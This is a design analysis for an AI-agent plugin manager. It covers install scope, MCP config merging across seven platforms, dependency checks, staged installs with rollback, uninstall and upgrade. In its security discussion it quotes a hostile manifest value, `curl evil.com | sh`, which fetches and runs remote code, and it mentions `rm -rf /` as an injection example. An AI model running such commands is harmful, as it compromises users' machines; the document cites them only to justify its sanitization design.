---
title: ANALYSIS-027 Installation Mechanics
type: analysis
permalink: analysis/analysis-027-installation-mechanics
tags:
- installation
- mcp-merging
- system-dependencies
- scope
- uninstall
- upgrade
- atomic-operations
- agent-plugin
---

# ANALYSIS-027 Installation Mechanics

## 1. Objective and Scope

**Objective**: How should @acmelabs-15/agent-plugin implement end-to-end plugin installation, covering install scope (global vs project), MCP server config merging, system dependency management, atomic operations with rollback, uninstallation, and upgrade mechanics?

**Scope**: Covers 6 research areas: (1) install scope patterns from npm, mise, proto, asdf, Vercel Skills, (2) MCP server config merging across 7 target platforms, (3) system dependency checking and auto-install policy, (4) end-to-end installation flow with atomicity and rollback, (5) uninstallation mechanics, (6) upgrade mechanics. Builds on ANALYSIS-010 (hook merge), ANALYSIS-011 (lockfile), ANALYSIS-012 (JSON config merge), ANALYSIS-014 (platform config).

**Excluded**: Hook execution consent (ADR-004). Plugin source resolution and fetching (separate concern). Scaffolding wizard UX (covered in ANALYSIS-018, ANALYSIS-022).

## 2. Context

ADR-003 established always-namespace for files, overlay/recompute for hooks, JSON lockfile with atomic writes, and hybrid D+C platform config. What ADR-003 did NOT fully specify:

- How MCP server entries are merged into platform config files
- How install scope (global vs project) affects the installation target
- How system dependencies declared by plugins are checked and handled
- The exact sequence of operations during install, and what happens on partial failure
- How uninstallation reverses each installation step
- How upgrades differ from fresh installs

These gaps must be closed before implementation.

## 3. Approach

**Methodology**: Web research across 35+ sources covering CLI plugin managers (mise, proto, asdf, npm, Homebrew, Vercel Skills), MCP server configuration documentation for all 7 target platforms, atomic file operation patterns in Bun/Node.js, and package manager rollback strategies.

**Tools Used**: WebSearch (16 queries), Brain MCP (6 existing analyses read), file reads of ADR-001 and ADR-003.

**Limitations**: Amp's MCP config documentation is sparse and evolving. OpenCode's MCP config is under active development (issue #1998 proposing multi-file split). Some platforms lack documented merge behavior when config files are programmatically modified.

## 4. Data and Analysis

### Evidence Gathered

| Finding | Source | Confidence |
|---|---|---|
| Claude Code MCP config: project scope at `.mcp.json` (project root), user scope at `~/.claude.json`. Format: `{ "mcpServers": { "name": { "command", "args", "env" } } }` | Claude Code docs, GitHub issues #5037, #4976 | High |
| Cursor MCP config: project scope at `.cursor/mcp.json`, global at `~/.cursor/mcp.json`. Format: `{ "mcpServers": { ... } }`. Missing `mcpServers` key silently ignored | Cursor docs, TrueFoundry guide | High |
| Windsurf MCP config: `~/.codeium/windsurf/mcp_config.json`. Format: `{ "mcpServers": { ... } }` with `disabled` and `alwaysAllow` fields. Follows Claude Desktop schema | Windsurf docs | High |
| Kiro MCP config: global at `~/.kiro/settings/mcp.json`, project at `.kiro/settings/mcp.json`. Both configs merged, workspace takes precedence | Kiro docs | High |
| VS Code / GitHub Copilot CLI MCP config: `.vscode/mcp.json` with `{ "servers": { ... } }` format (NOT `mcpServers`). Also `.copilot/mcp-config.json` | VS Code docs, GitHub Copilot docs | High |
| OpenCode MCP config: `opencode.json` at project root or `~/.config/opencode/opencode.json`. MCP entries under `"mcp"` key | OpenCode docs | High |
| Amp MCP config: `.amp/settings.json` (workspace) or `~/.config/amp/settings.json` (global). MCP entries under `"amp.mcpServers"` key | Amp manual, workspace settings docs | Medium |
| mise uses `.mise.toml` (local) and `~/.config/mise/config.toml` (global). `mise use` defaults to local; `mise use -g` targets global. Config hierarchy: system -> user -> project -> local | mise docs | High |
| proto uses `.prototools` (local) and `~/.proto/.prototools` (global). `--pin local` vs `--pin global` for install scope. Version detection traverses upward from CWD | proto/moonrepo docs | High |
| npm local install is the recommended default. Global install only for CLI tools used across projects. npx eliminates many global install needs | npm docs, community guides | High |
| Vercel Skills supports both project scope and global scope (`-g` flag). Offers symlink mode (single source, easy updates) and copy mode (independent copies). `npx skills update` only works for global installs | Vercel Skills GitHub, npm, Vercel KB | High |
| Bun.write() uses optimized file I/O. Atomic write pattern (temp file + rename) works in Bun via node:fs compatibility. `atomically` npm package is compatible with Bun | Bun docs, community guides | High |
| npm queues all rollbacks until process exit to prevent race conditions. Deduplicates failed install list before rollback | npm GitHub issues, PRs | Medium |
| In 2024, 500,000+ malicious packages detected (156% increase). Open source comprises 70-90% of modern software code. Auto-installing dependencies introduces supply chain risk | Linux Foundation, Aikido security report | High |
| Homebrew now requires codesigning and notarization for casks (deprecated unsigned by Sep 2026). Spoofed Homebrew installer sites discovered in Sep 2025 | Homebrew 5.0.0 blog, GBHackers report | High |
| cargo install checks for newer versions since 0.42.0 and installs if available. Replaces old binary, does not keep previous version | Rust forum, cargo docs | High |

### Facts (Verified)

- [fact] All 7 target platforms use JSON config files for MCP server definitions. 6 of 7 use the `mcpServers` key pattern; VS Code/Copilot uses `servers` instead.
- [fact] All 7 platforms support at least 2 scopes: project-level and user/global-level MCP config.
- [fact] mise, proto, and asdf all default to project-local scope. Global scope requires an explicit flag (`-g`, `--pin global`).
- [fact] npm recommends local install as default. Global install only for CLI tools used in the terminal, not project dependencies.
- [fact] Vercel Skills offers two install modes: symlink (shared source) and copy (independent). Only global installs support `update`.
- [fact] The atomic write pattern (temp file in same directory + rename) is supported in Bun via `atomically` npm package or manual node:fs operations.
- [fact] npm deduplicates failed installs before rollback and queues all rollbacks until process exit to prevent race conditions.

### Hypotheses (Unverified)

- [hypothesis] Project scope should be the default install scope because it matches npm, mise, proto, and asdf conventions, and provides per-project reproducibility.
- [hypothesis] MCP server entries should be namespaced as `agentplugin:plugin-name:server-name` to enable clean tracking and removal without affecting user-configured servers.
- [hypothesis] System dependencies should be CHECK-only (no auto-install) because auto-installing binaries introduces supply chain risk and violates the principle of least surprise.
- [hypothesis] A staged installation with checkpoint-based rollback provides sufficient atomicity without requiring a full transactional filesystem.

## 5. Results

### RQ1: Install Scope (Global vs Project)

#### Cross-Tool Scope Comparison

| Tool | Default Scope | Global Flag | Config File (Local) | Config File (Global) | Lockfile Scope |
|---|---|---|---|---|---|
| npm | Local (project) | `-g` / `--global` | `package.json` | `~/.npmrc` | `package-lock.json` (project) |
| mise | Local (project) | `-g` | `.mise.toml` | `~/.config/mise/config.toml` | N/A |
| proto | Local (project) | `--pin global` | `.prototools` | `~/.proto/.prototools` | N/A |
| asdf | Local (project) | `global` subcommand | `.tool-versions` | `~/.tool-versions` | N/A |
| Vercel Skills | Local (project) | `-g` | Per-platform dirs | `~/.cursor/skills/` etc. | N/A |
| Homebrew | Global (system) | N/A (always global) | N/A | `/opt/homebrew/` | N/A |

**Pattern**: Every tool that manages per-project tooling defaults to project scope. Only system-level package managers (Homebrew, apt) default to global. Agent plugins are project tooling.

#### Recommended Scope Model for agent-plugin

**Default**: Project scope. Plugins install to the current project directory.

**Global flag**: `--global` or `-g`. Plugins install to `~/.config/agent-plugin/`.

**Scope resolution**:

```text
agent-plugin install my-plugin         -> project scope (default)
agent-plugin install my-plugin -g      -> global scope
agent-plugin install my-plugin --global -> global scope
```

**Scope affects 4 things**:

1. File installation target (project root vs `~/.config/agent-plugin/plugins/`)
2. Lockfile location (`./plugin-lock.json` vs `~/.config/agent-plugin/plugin-lock.json`)
3. Platform config file targeted (project-level vs user-level)
4. MCP server config file targeted (project `.mcp.json` vs user `~/.claude.json`, etc.)

**Interaction with platforms**: Each platform has project-level and user-level config files. The install scope determines which config file receives MCP server entries and hook contributions.

| Platform | Project Config | User/Global Config |
|---|---|---|
| Claude Code | `.mcp.json` | `~/.claude.json` |
| Cursor | `.cursor/mcp.json` | `~/.cursor/mcp.json` |
| Windsurf | N/A (global only) | `~/.codeium/windsurf/mcp_config.json` |
| Kiro | `.kiro/settings/mcp.json` | `~/.kiro/settings/mcp.json` |
| VS Code / Copilot | `.vscode/mcp.json` | User settings |
| OpenCode | `opencode.json` | `~/.config/opencode/opencode.json` |
| Amp | `.amp/settings.json` | `~/.config/amp/settings.json` |

**Windsurf exception**: Windsurf only has global MCP config (`~/.codeium/windsurf/mcp_config.json`). A project-scoped install targeting Windsurf must still write to the global config file. The lockfile tracks this as a "global-redirect" so uninstall knows which file to clean.

### RQ2: MCP Server Config Merging

This is the area ADR-003 left unspecified. MCP server entries are fundamentally different from hook entries:

- Hooks merge additively (multiple hooks on same event all run)
- MCP servers are named entries in a JSON object (each server has a unique key)

#### MCP Config File Formats by Platform

**Format A (6 platforms)**: `{ "mcpServers": { "server-name": { "command": "...", "args": [...], "env": {...} } } }`

Used by: Claude Code, Cursor, Windsurf, Kiro, OpenCode (under `"mcp"` key), Amp (under `"amp.mcpServers"` key)

**Format B (1 platform)**: `{ "servers": { "server-name": { "type": "...", "command": "...", "args": [...] } } }`

Used by: VS Code / GitHub Copilot CLI

The platform adapter layer (ADR-003 Decision 4) must handle this format divergence.

#### MCP Entry Namespacing

MCP server entries SHOULD be namespaced to enable clean tracking and prevent collisions with user-configured servers.

**Recommended key format**: `agentplugin--{plugin-name}--{server-name}`

Example: A plugin named `db-tools` declaring an MCP server named `postgres` installs as:

```json
{
  "mcpServers": {
    "agentplugin--db-tools--postgres": {
      "command": "node",
      "args": ["/path/to/db-tools/mcp/postgres-server.js"],
      "env": {}
    }
  }
}
```

**Why double-dash (`--`) instead of colon**: MCP server names are JSON object keys. While colons are valid in JSON keys, some platforms may parse or display them unexpectedly. Double-dash is safe across all contexts and visually distinct.

**Why not `agentplugin:plugin:server`**: The colon is the logical namespace separator for component names (ADR-003). Using it in MCP keys too would create ambiguity between component references and MCP config keys.

**Collision handling**: If a user already has a server with the same namespaced key (unlikely given the prefix), the installer warns and skips. The namespace prefix makes accidental collisions near-impossible.

#### MCP Merge Algorithm

```text
1. Read existing platform config file (e.g., .mcp.json)
2. Parse JSON. On failure, warn and abort MCP merge (do not corrupt user config)
3. For each MCP server declared by the plugin:
   a. Compute namespaced key: agentplugin--{plugin-name}--{server-name}
   b. Check if key exists in config
   c. If exists AND installed by us (prefix match): update entry
   d. If exists AND NOT installed by us: warn, skip
   e. If not exists: add entry
4. Write updated config atomically (temp file + rename)
5. Record in lockfile: which platform config files were modified, which keys were added
```

#### MCP Unmerge Algorithm

```text
1. Read lockfile to find which MCP keys were installed for this plugin
2. For each platform config file that was modified:
   a. Read config file
   b. Remove all keys with prefix agentplugin--{plugin-name}--
   c. Write updated config atomically
3. Update lockfile to remove MCP tracking entries
```

#### Two Plugins Wanting the Same MCP Server

If two plugins both want to provide the same underlying MCP server (e.g., both bundle a GitHub MCP server), the namespacing ensures both install independently:

- `agentplugin--plugin-a--github` and `agentplugin--plugin-b--github`

Both servers run independently. This may be wasteful (two processes), but it is correct and avoids the complexity of shared-dependency resolution. A future optimization could deduplicate identical MCP server commands, but this is not required for v1.

#### Lockfile MCP Tracking

The lockfile records MCP installations per plugin per platform:

```json
{
  "plugins": {
    "db-tools": {
      "mcp": {
        "claude-code": {
          "configFile": ".mcp.json",
          "keys": ["agentplugin--db-tools--postgres"]
        },
        "cursor": {
          "configFile": ".cursor/mcp.json",
          "keys": ["agentplugin--db-tools--postgres"]
        }
      }
    }
  }
}
```

### RQ3: System Dependency Management

#### The Auto-Install Question

**Community consensus: CHECK, do not auto-install.**

Evidence supporting check-only:

- 500,000+ malicious packages detected in 2024 (156% increase year-over-year)
- Homebrew spoofed installer sites discovered in Sep 2025
- Auto-installing binaries violates principle of least surprise
- Security: executing arbitrary install commands from plugin manifests is a CWE-94 risk
- npm, mise, proto, asdf all require explicit user action to install system tools
- Even Homebrew (which auto-installs dependencies) does so from a curated, signed repository

**Recommended policy**: The plugin manager checks system dependencies and reports missing/incompatible versions. It provides actionable instructions for the user to install them manually. It never executes install commands on behalf of plugins.

#### Dependency Declaration in plugin.json

```json
{
  "systemDependencies": {
    "node": { "minimum": "18.0.0", "check": "node --version" },
    "docker": { "minimum": "20.0.0", "check": "docker --version", "optional": true }
  }
}
```

Fields:

- `minimum`: Semver version string. Checked against parsed output.
- `check`: Command to run to get version output. Validated by sanitization pipeline (ADR-003 Decision 5). Only `--version` and `-v` flags allowed.
- `optional`: If true, missing dependency is a warning, not a blocker.

#### Version Checking Pattern

```text
1. Parse systemDependencies from plugin.json
2. For each dependency:
   a. Run `which {binary}` (or `where` on Windows) to check existence
   b. If not found: report missing with install instructions
   c. If found: run {check} command with 5-second timeout
   d. Parse version from output using semver regex
   e. Compare against minimum using semver.satisfies()
   f. If below minimum: report version mismatch with required vs actual
3. If any required (non-optional) dependency fails: abort install
4. If only optional dependencies fail: warn and continue
```

**Timeout**: 5 seconds per dependency check. Prevents hanging on unresponsive commands.

**Parsing**: Version strings vary across tools (`v18.0.0`, `18.0.0`, `node v18.0.0`). Use regex `/(\d+\.\d+\.\d+)/` to extract the first semver-like string from output.

**Security constraints**:

- The `check` field is validated by the sanitization pipeline (shell-quote AST inspection)
- Only simple commands allowed: `{binary} --version` or `{binary} -v`
- No pipes, redirects, chains, or subshells
- The binary name must match the dependency key (prevents `node --version` from running `rm -rf /`)

### RQ4: Installation Flow End-to-End

#### Phase Model

Installation proceeds in 5 sequential phases. Each phase is a checkpoint. On failure, rollback reverses completed phases in reverse order.

```text
Phase 1: RESOLVE
  - Validate plugin.json schema (Zod)
  - Check system dependencies
  - Verify target platform(s) are available
  - Output: validated manifest + dependency status

Phase 2: STAGE
  - Create staging directory: .agent-plugin-staging/{plugin-name}/
  - Copy/transform files to staging (namespaced paths)
  - Generate platform-specific frontmatter
  - Compute MCP server entries
  - Output: staged files ready for installation

Phase 3: INSTALL FILES
  - Copy staged files to target directories (project or global)
  - All file operations use atomic writes (temp + rename)
  - Record each file operation in an in-memory transaction log
  - Output: files installed, transaction log populated

Phase 4: MERGE CONFIGS
  - Merge MCP server entries into platform config files
  - Merge hook contributions via overlay/recompute (ADR-003)
  - Update platform instruction files (managed sections)
  - Each config modification recorded in transaction log
  - Output: platform configs updated

Phase 5: COMMIT
  - Write lockfile with all tracking data (atomic write)
  - Write lockfile backup (.bak)
  - Remove staging directory
  - Output: installation complete
```

#### Rollback on Failure

If any phase fails, rollback executes completed phases in reverse:

```text
Phase 5 failure: Remove lockfile changes (restore from .bak)
Phase 4 failure: Restore platform configs from pre-merge snapshots
Phase 3 failure: Delete installed files using transaction log
Phase 2 failure: Remove staging directory
Phase 1 failure: No changes made, nothing to rollback
```

**Pre-merge snapshots**: Before modifying any platform config file (Phase 4), the installer reads and stores the file's current content in memory. On rollback, the original content is written back atomically.

**Transaction log**: An in-memory array of `{ action: "create" | "modify", path: string, backup?: string }` entries. On rollback, "create" entries trigger file deletion; "modify" entries trigger backup restoration.

#### Staging Directory

The staging directory (`.agent-plugin-staging/`) serves two purposes:

1. Validates all file transformations before touching the target
2. Provides a clean separation between preparation and execution

The staging directory is created at the start of Phase 2 and removed at the end of Phase 5 (success) or during rollback (failure). If a stale staging directory exists from a previous crashed install, the installer detects it, warns, and removes it before proceeding.

#### Progress Reporting

Each phase reports progress via @clack/prompts spinner:

```text
[spinner] Resolving plugin dependencies...
[spinner] Staging 12 files...
[spinner] Installing files (7/12)...
[spinner] Merging MCP configs for 3 platforms...
[spinner] Updating lockfile...
[PASS] Plugin my-plugin@1.2.0 installed successfully
```

In CI mode (non-interactive), progress is logged as plain text lines without spinners (ANALYSIS-024).

### RQ5: Uninstallation Mechanics

Uninstallation reverses each installation step using data from the lockfile.

#### Uninstall Flow

```text
Phase 1: VALIDATE
  - Read lockfile
  - Verify plugin is installed
  - Gather all tracking data (files, MCP keys, hook contributions)

Phase 2: REMOVE FILES
  - Delete all namespaced files installed by this plugin
  - Transaction: files tracked by lockfile's component inventory

Phase 3: UNMERGE CONFIGS
  - Remove MCP server entries (keys with agentplugin--{plugin-name}-- prefix)
  - Remove hook contributions from lockfile, recompute merged hooks
  - Update platform instruction files (remove managed section)

Phase 4: UPDATE LOCKFILE
  - Remove plugin entry from lockfile
  - Write updated lockfile atomically
  - Write backup

Phase 5: CLEANUP
  - Remove empty directories left by file deletion
  - Report any orphaned resources that could not be automatically cleaned
```

#### Orphaned Resource Detection

After uninstallation, the following may be orphaned:

| Resource | Detection | Action |
|---|---|---|
| Empty plugin namespace directory | `fs.readdir()` returns empty | Auto-remove |
| MCP server process still running | Not detectable by plugin manager | Document in uninstall output |
| Platform config references to removed server | Scan for references | Warn user |

#### Force Uninstall

If the lockfile is missing or corrupted, `agent-plugin uninstall --force {plugin-name}` attempts cleanup by:

1. Scanning for files matching the plugin's namespace pattern
2. Scanning platform config files for MCP entries with the plugin's namespace prefix
3. Removing discovered resources without lockfile validation

### RQ6: Upgrade Mechanics

#### Upgrade Strategy: Atomic Replace

Upgrade uses an atomic replace pattern: install new version, then remove old version. NOT incremental patching.

**Rationale**: Incremental patching requires diff computation, handles renamed/deleted files poorly, and introduces merge conflicts with user modifications. Atomic replace is simpler, more reliable, and matches how npm, cargo, and mise handle upgrades.

#### Upgrade Flow

```text
Phase 1: RESOLVE NEW VERSION
  - Fetch new plugin version
  - Parse and validate new manifest
  - Compare with installed version (semver)
  - Detect breaking changes (removed components, renamed components)

Phase 2: INSTALL NEW VERSION (full install flow)
  - Stage new files alongside existing
  - New files use same namespace, overwriting old files
  - New MCP entries replace old entries (same namespaced keys)
  - New hook contributions replace old contributions in lockfile

Phase 3: CLEANUP OLD VERSION
  - Identify files present in old version but absent in new
  - Remove orphaned old files
  - Remove orphaned MCP entries
  - Recompute hooks without removed contributions

Phase 4: COMMIT
  - Update lockfile with new version metadata
  - Write backup
```

#### Version Comparison

```text
- No version specified: fetch latest, compare with installed
- Version specified: fetch exact version, compare with installed
- Same version: skip (already installed), unless --force flag
- Newer version: proceed with upgrade
- Older version: warn (downgrade), proceed only with --force flag
```

#### Breaking Change Detection

Compare old and new manifests:

- Components removed: warn user, list affected components
- Components renamed: treat as remove + add (namespace handles this cleanly)
- System dependencies changed: re-check dependencies before proceeding
- MCP servers removed: warn that platform config entries will be removed

#### Rollback on Upgrade Failure

If upgrade fails mid-flight, the old version's data is still in the lockfile backup. Recovery:

1. Restore lockfile from `.bak`
2. Recompute hooks from restored lockfile data
3. Restore MCP entries from restored lockfile data
4. Report which files may be in an inconsistent state

The user can then run `agent-plugin doctor` to verify state consistency.

## 6. Discussion

### MCP Merging is the Hardest Problem

Unlike files (namespaced, no conflicts) and hooks (overlay/recompute), MCP server entries live in platform-owned JSON config files alongside user-configured servers. The installer must:

1. Parse JSON that the user may have hand-edited (comments, trailing commas in JSONC)
2. Add entries without breaking existing entries
3. Track which entries it added for later removal
4. Handle format differences across platforms (mcpServers vs servers vs mcp vs amp.mcpServers)

The namespaced key approach (`agentplugin--{plugin-name}--{server-name}`) provides clean provenance tracking without a separate manifest. Any key with the `agentplugin--` prefix is plugin-managed. All other keys are user-owned and untouched.

**JSONC handling**: Cursor, VS Code, and OpenCode support JSON with comments (JSONC). The installer should use a JSONC parser (e.g., `jsonc-parser` npm package, 8.2M weekly downloads) to preserve comments during read-modify-write operations.

### Why Project Scope Should Be Default

Project scope as default aligns with:

1. npm (local by default, `-g` for global)
2. mise (`mise use` = local, `mise use -g` = global)
3. proto (`--pin local` is default)
4. Vercel Skills (project scope default)
5. The project's own ADR-003 lockfile design (project root by default)

Global scope makes sense for plugins that provide cross-project capabilities (e.g., a universal code review skill). But most plugins are project-specific.

### Why Not Auto-Install System Dependencies

Three arguments against auto-installing:

1. **Security**: Running install commands from untrusted plugin manifests is arbitrary code execution. Even restricting to package manager commands (brew, apt) is dangerous: a malicious plugin could declare `{ "check": "curl evil.com | sh" }`.

2. **Principle of least surprise**: Users expect a plugin manager to manage plugins, not install system software. npm does not install Python when a package needs node-gyp.

3. **Cross-platform complexity**: Auto-installing on macOS (Homebrew), Linux (apt/dnf/pacman), and Windows (winget/choco/scoop) requires detecting the OS, detecting the package manager, and knowing the correct package name on each. This is a separate tool's job (mise, proto, asdf).

The sanitization pipeline (ADR-003 Decision 5) restricts check commands to `{binary} --version` or `{binary} -v` patterns only. This prevents injection via the `check` field.

### Staging Directory vs In-Place Installation

An alternative to the staging approach is in-place installation with per-file rollback. The staging approach is preferred because:

1. All file transformations (namespacing, frontmatter generation) can be validated before any files are placed in the target
2. Rollback of Phase 2 (staging) is trivial: delete the staging directory
3. Phase 3 (install files) becomes a simple copy from staging to target
4. Debugging: if installation fails, the staging directory contents can be inspected

The cost is temporary disk space (up to 2x plugin size during install). For the small file sizes of AI agent plugins (typically <1MB total), this is negligible.

### Upgrade as Replace vs Patch

Incremental patching (compute diff, apply only changes) has two advantages: (1) faster for large plugins with small changes, (2) preserves user modifications to installed files.

However, user modifications to installed files violate the namespacing contract. Installed files are managed by the plugin manager. User modifications should go in user-owned files (not in the plugin namespace). Therefore, preserving user modifications is not a requirement.

Atomic replace is simpler, more predictable, and eliminates an entire class of merge conflicts.

## 7. Recommendations

| Priority | Recommendation | Rationale | Effort |
|---|---|---|---|
| P0 | Default to project scope for plugin installation. Require `--global` or `-g` flag for global scope. | Matches npm, mise, proto, asdf conventions. Provides per-project reproducibility. Aligns with ADR-003 lockfile design. | Low |
| P0 | Namespace MCP server entries as `agentplugin--{plugin-name}--{server-name}` in platform config files. | Enables clean provenance tracking and removal. Prevents collisions with user-configured MCP servers. Eliminates need for separate MCP tracking manifest. | Low |
| P0 | Implement 5-phase install flow (resolve, stage, install files, merge configs, commit) with checkpoint-based rollback. | Prevents partial installs from corrupting project state. Staging validates all transformations before touching target. Transaction log enables clean rollback. | High |
| P0 | Use platform-specific adapter functions for MCP config merging. Handle format differences (mcpServers vs servers vs mcp vs amp.mcpServers) per platform. | 7 platforms use 4 different JSON key structures for MCP config. A single merge function cannot handle all. Platform adapters (already established in ADR-003 Decision 4) extend naturally to MCP. | Medium |
| P1 | Check system dependencies without auto-installing. Report missing/incompatible versions with actionable install instructions. | Security risk of auto-install outweighs convenience. 500K+ malicious packages in 2024 demonstrates supply chain risk. Matches npm, mise, and proto behavior. | Low |
| P1 | Restrict `systemDependencies.check` commands to `{binary} --version` or `{binary} -v` patterns via sanitization pipeline. 5-second timeout per check. | Prevents CWE-94 injection via check command field. Timeout prevents hanging on unresponsive commands. | Low |
| P1 | Use JSONC parser (jsonc-parser npm package) for reading platform config files that may contain comments (Cursor, VS Code, OpenCode). | Preserves user comments during read-modify-write. Standard JSON.parse would strip comments or fail. | Low |
| P1 | Implement uninstall as 5-phase reverse of install, using lockfile data for resource tracking. Support `--force` flag for corrupted-lockfile cleanup via filesystem scanning. | Clean uninstallation is table-stakes for plugin managers. Force mode recovers from lockfile corruption. | Medium |
| P1 | Implement upgrade as atomic replace (install new, remove orphaned old files). Not incremental patching. | Simpler, more reliable, eliminates merge conflict class. Matches npm, cargo, and mise patterns. User modifications to managed files are not a supported workflow. | Medium |
| P2 | Handle Windsurf global-redirect for project-scoped installs. Track in lockfile that project-scoped install wrote to global config due to platform limitation. | Windsurf only has global MCP config. Without tracking, uninstall would not know which file to clean. | Low |
| P2 | Detect stale `.agent-plugin-staging/` directories from crashed installs. Warn and offer cleanup on next install. | Prevents accumulation of stale staging data. Improves recovery from interrupted installs. | Low |
| P2 | Implement breaking change detection for upgrades: compare old and new manifests for removed/renamed components, changed system dependencies. Warn user before proceeding. | Users need to know when an upgrade will remove capabilities they depend on. | Low |

## 8. Conclusion

**Verdict**: Proceed with implementation

**Confidence**: High

**Rationale**: The installation mechanics are well-defined by prior ADRs and existing analyses. This analysis fills 3 gaps: (1) MCP server config merging uses namespaced keys (`agentplugin--{plugin-name}--{server-name}`) with per-platform adapter functions, following the same adapter pattern established for platform config in ADR-003. (2) Install scope defaults to project, matching npm/mise/proto conventions and the existing lockfile design. (3) System dependency checking uses a check-only policy with sanitized commands, rejecting auto-install for security reasons. The 5-phase install flow with staging and checkpoint-based rollback provides atomicity without requiring transactional filesystem support.

### User Impact

- **What changes for you**: Plugins install to the current project by default (use `-g` for global). MCP servers appear in your platform's config file with a clear `agentplugin--` prefix so you know which entries are managed. System dependencies are checked but never auto-installed. If an install fails mid-way, all changes are rolled back cleanly.
- **Effort required**: High for initial implementation. The 5-phase install flow, 7 platform MCP adapters, staging/rollback system, and lockfile tracking are the core of the CLI tool. Estimated 2000-3000 lines of TypeScript across install, uninstall, and upgrade commands.
- **Risk if ignored**: Without atomic operations, a crashed install leaves the project in an inconsistent state (partial files, orphaned MCP entries, corrupted lockfile). Without MCP namespacing, uninstall cannot distinguish plugin-managed servers from user-configured ones. Without scope defaults, users must specify scope on every command.

## 9. Appendices

### MCP Config File Reference

| Platform | Project Config Path | Global Config Path | Root Key | Server Entry Format |
|---|---|---|---|---|
| Claude Code | `.mcp.json` | `~/.claude.json` | `mcpServers` | `{ command, args, env }` |
| Cursor | `.cursor/mcp.json` | `~/.cursor/mcp.json` | `mcpServers` | `{ command, args, env }` |
| Windsurf | N/A | `~/.codeium/windsurf/mcp_config.json` | `mcpServers` | `{ command, args, env, disabled, alwaysAllow }` |
| Kiro | `.kiro/settings/mcp.json` | `~/.kiro/settings/mcp.json` | `mcpServers` | `{ command, args, env, disabled, autoApprove }` |
| VS Code / Copilot | `.vscode/mcp.json` | User settings | `servers` | `{ type, command, args, env }` |
| OpenCode | `opencode.json` (mcp section) | `~/.config/opencode/opencode.json` | `mcp` | `{ command, args, env }` |
| Amp | `.amp/settings.json` | `~/.config/amp/settings.json` | `amp.mcpServers` | `{ command, args }` |

### Install Flow State Machine

```text
IDLE -> RESOLVING -> STAGING -> INSTALLING_FILES -> MERGING_CONFIGS -> COMMITTING -> COMPLETE
                                                                                  -> ROLLING_BACK -> FAILED
Each phase can transition to ROLLING_BACK on error.
ROLLING_BACK reverses completed phases in reverse order, then transitions to FAILED.
```

### Lockfile MCP Tracking Schema

```json
{
  "plugins": {
    "{plugin-name}": {
      "version": "1.0.0",
      "scope": "project",
      "components": { "skills": [...], "agents": [...], "mcp": [...] },
      "hooks": { "{platform}": { "...overlay data..." } },
      "mcp": {
        "{platform}": {
          "configFile": "{relative or absolute path}",
          "keys": ["agentplugin--{plugin-name}--{server-name}"]
        }
      },
      "files": [
        { "path": "{relative path}", "hash": "sha256-..." }
      ]
    }
  }
}
```

### Sources Consulted

- Claude Code MCP docs: <https://code.claude.com/docs/en/mcp>
- Claude Code MCP issues: <https://github.com/anthropics/claude-code/issues/5037>, <https://github.com/anthropics/claude-code/issues/4976>
- Cursor MCP docs: <https://cursor.com/docs/context/mcp>
- Cursor MCP setup guide: <https://www.truefoundry.com/blog/mcp-servers-in-cursor-setup-configuration-and-security-guide>
- Windsurf MCP docs: <https://docs.windsurf.com/windsurf/cascade/mcp>
- Kiro MCP docs: <https://kiro.dev/docs/mcp/configuration/>
- VS Code MCP docs: <https://code.visualstudio.com/docs/copilot/customization/mcp-servers>
- GitHub Copilot CLI MCP: <https://docs.github.com/en/copilot/how-tos/provide-context/use-mcp/set-up-the-github-mcp-server>
- OpenCode config: <https://opencode.ai/docs/config/>, <https://opencode.ai/docs/mcp-servers/>
- Amp manual: <https://ampcode.com/manual>, <https://ampcode.com/news/cli-workspace-settings>
- mise docs: <https://mise.jdx.dev/configuration.html>, <https://mise.jdx.dev/cli/use.html>
- proto/moonrepo docs: <https://moonrepo.dev/docs/proto/config>, <https://moonrepo.dev/docs/proto/commands/install>
- npm global vs local: <https://nodejs.org/en/blog/npm/npm-1-0-global-vs-local-installation>
- Vercel Skills: <https://github.com/vercel-labs/skills>, <https://vercel.com/kb/guide/agent-skills-creating-installing-and-sharing-reusable-agent-context>
- Bun file I/O: <https://bun.com/docs/runtime/file-io>
- atomically npm: <https://github.com/fabiospampinato/atomically>
- Homebrew 5.0.0 security: <https://workbrew.com/blog/homebrew-5-0-0>
- Homebrew spoofing: <https://gbhackers.com/homebrew-websites/>
- Malicious packages 2024: <https://www.aikido.dev/blog/top-open-source-dependency-scanners>
- cargo install updates: <https://users.rust-lang.org/t/how-to-update-a-binary-installed-with-cargo-install/17025>

### Data Transparency

- **Found**: MCP config file locations and formats for all 7 target platforms. Install scope patterns from 6 CLI tools (npm, mise, proto, asdf, Vercel Skills, Homebrew). Atomic write patterns for Bun. npm rollback mechanics. Supply chain security statistics for 2024.
- **Not Found**: Amp's exact MCP config schema documentation (evolving rapidly). Whether any platform validates MCP server names against a character set. How platforms handle duplicate MCP server keys (overwrite vs error vs ignore). Performance benchmarks for staging-based vs in-place installation. Real-world data on how many plugins typically declare system dependencies.

## Observations

- [decision] Project scope is the default install scope; `--global` / `-g` flag required for user-wide installation #scope #architecture
- [decision] MCP server entries namespaced with slash separator (`plugin-name/server-name`), consistent with directory-based namespacing. Supersedes double-dash proposal from initial research. #mcp #namespacing
- [decision] System/platform dependencies: agent-plugin CAN install platform CLIs and system deps with explicit user confirmation via @clack/prompts. All installed deps tracked in plugin-lock.json for uninstall. Supersedes check-only recommendation from initial research. #dependencies #system-deps
- [decision] 6-phase install flow (Detect, Select, Resolve, Confirm, Apply, Record) with checkpoint-based rollback on failure. User selects which platforms to install to via @clack/prompts multiselect. Missing platforms treated as installable deps. Supersedes 5-phase model from initial research. #installation #atomicity
- [decision] Upgrade is interactive: scan installed plugins, check latest versions, present @clack/prompts multiselect showing `plugin-name current -> latest`. User picks which to upgrade. Each does atomic replace with rollback on failure. #upgrade #interactive
- [fact] 7 platforms use 4 different JSON key structures for MCP server config: mcpServers (4), servers (1), mcp (1), amp.mcpServers (1) #mcp #platform-diversity
- [fact] All 7 target platforms support at least 2 scopes (project and user/global) for MCP config, except Windsurf which is global-only #mcp #scope
- [fact] 500,000+ malicious packages detected in 2024 (156% increase). Auto-installing system dependencies from plugin manifests is a supply chain risk #security #dependencies
- [technique] Pre-merge snapshots of platform config files enable clean rollback on failure without requiring a transactional filesystem #rollback #resilience
- [technique] JSONC parser needed for Cursor, VS Code, and OpenCode config files to preserve user comments during read-modify-write #jsonc #compatibility
- [risk] Windsurf global-redirect: project-scoped installs must write MCP entries to Windsurf's global config due to platform limitation. Requires tracking in lockfile for clean uninstall #windsurf #scope-mismatch
